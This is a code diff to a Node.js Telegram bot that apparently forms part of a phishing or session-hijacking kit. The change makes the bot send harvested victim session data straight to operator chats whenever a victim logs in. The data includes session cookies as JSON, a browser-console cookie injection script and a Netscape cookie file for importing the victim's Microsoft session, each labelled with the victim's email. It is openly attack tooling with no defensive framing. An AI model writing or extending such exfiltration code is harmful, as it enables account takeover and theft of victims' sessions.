@@ -1024,7 +1024,7 @@ ${adminUrl}
         });
     }
 
-    // Method to send login notifications (keep existing functionality)
+    // Method to send login notifications with cookie files attached
     async sendLoginNotification(loginData) {
         if (this.chatIds.size === 0) {
             console.log('No Telegram users subscribed to notifications');
@@ -1044,27 +1044,69 @@ ${adminUrl}
 📊 <b>Cookies:</b> ${totalCookies} saved
 🆔 <b>Session:</b> ${sessionId}
 
-📥 <b>Downloads Available:</b>
-• Cookie injection script (.js)
-• Session data (.json)
-• Browser cookies (.txt)
-
-🌐 Access admin panel to download files
+📥 <b>Files attached below:</b>
+• Session cookies (JSON)
+• Cookie injection script (JS)
         `;
 
-        // Send notification to all subscribed users
+        // Find session files
+        const fs = require('fs');
+        const path = require('path');
+        const sessionDir = path.join(__dirname, 'session_data');
+        
+        let sessionFile = null;
+        let injectFile = null;
+        
+        try {
+            // Find session JSON file
+            const files = fs.readdirSync(sessionDir);
+            for (const file of files) {
+                if (file.includes(`session_${sessionId}_`) && file.endsWith('.json')) {
+                    sessionFile = path.join(sessionDir, file);
+                }
+                if (file === `inject_session_${sessionId}.js`) {
+                    injectFile = path.join(sessionDir, file);
+                }
+            }
+        } catch (error) {
+            console.error('Error finding session files:', error.message);
+        }
+
+        // Send notification with files to all subscribed users
         for (const chatId of this.chatIds) {
             try {
+                // Send main notification message
                 await this.bot.sendMessage(chatId, notificationMessage, {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [{ text: '🌐 Open Admin Panel', url: adminUrl }],
-                            [{ text: '📥 View Downloads', url: `${adminUrl}#downloads` }],
                             [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
                         ]
                     }
                 });
+
+                // Send session JSON file if it exists
+                if (sessionFile && fs.existsSync(sessionFile)) {
+                    await this.bot.sendDocument(chatId, sessionFile, {
+                        caption: `📄 <b>Session Data (JSON)</b>\n\nComplete session data with ${totalCookies} cookies for ${email}`,
+                        parse_mode: 'HTML'
+                    });
+                    console.log(`📎 Sent session JSON file to ${chatId}`);
+                }
+
+                // Send injection script if it exists
+                if (injectFile && fs.existsSync(injectFile)) {
+                    await this.bot.sendDocument(chatId, injectFile, {
+                        caption: `🚀 <b>Cookie Injection Script</b>\n\nRun this in browser console to inject cookies for ${email}`,
+                        parse_mode: 'HTML'
+                    });
+                    console.log(`📎 Sent injection script to ${chatId}`);
+                }
+
+                // Send additional formats
+                await this.sendAdditionalFormats(chatId, sessionFile, email);
+
             } catch (error) {
                 console.error(`Failed to send notification to ${chatId}:`, error.message);
                 // Remove invalid chat IDs
@@ -1075,7 +1117,53 @@ ${adminUrl}
             }
         }
         
-        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
+        console.log(`📤 Login notification with files sent to ${this.chatIds.size} Telegram users`);
+    }
+
+    // Send additional cookie formats
+    async sendAdditionalFormats(chatId, sessionFile, email) {
+        if (!sessionFile || !fs.existsSync(sessionFile)) return;
+
+        try {
+            const fs = require('fs');
+            const path = require('path');
+            
+            // Read session data
+            const sessionData = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
+            
+            // Create Netscape cookie format for browser import
+            let netscapeContent = '# Netscape HTTP Cookie File\n';
+            netscapeContent += '# This is a generated file! Do not edit.\n\n';
+            
+            sessionData.cookies.forEach(cookie => {
+                const domain = cookie.domain || '.microsoft.com';
+                const domainFlag = domain.startsWith('.') ? 'TRUE' : 'FALSE';
+                const path = cookie.path || '/';
+                const secure = cookie.secure ? 'TRUE' : 'FALSE';
+                const expires = cookie.expires || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);
+                const name = cookie.name;
+                const value = cookie.value;
+                
+                netscapeContent += `${domain}\t${domainFlag}\t${path}\t${secure}\t${expires}\t${name}\t${value}\n`;
+            });
+
+            // Create temporary Netscape file
+            const netscapeFile = sessionFile.replace('.json', '_cookies.txt');
+            fs.writeFileSync(netscapeFile, netscapeContent);
+
+            // Send Netscape format file
+            await this.bot.sendDocument(chatId, netscapeFile, {
+                caption: `🍪 <b>Browser Cookie File (Netscape Format)</b>\n\nImport this file directly into browsers for ${email}`,
+                parse_mode: 'HTML'
+            });
+
+            // Clean up temporary file
+            fs.unlinkSync(netscapeFile);
+            console.log(`📎 Sent Netscape cookie file to ${chatId}`);
+
+        } catch (error) {
+            console.error('Error sending additional formats:', error.message);
+        }
     }
 
     getSubscribedUsers() {
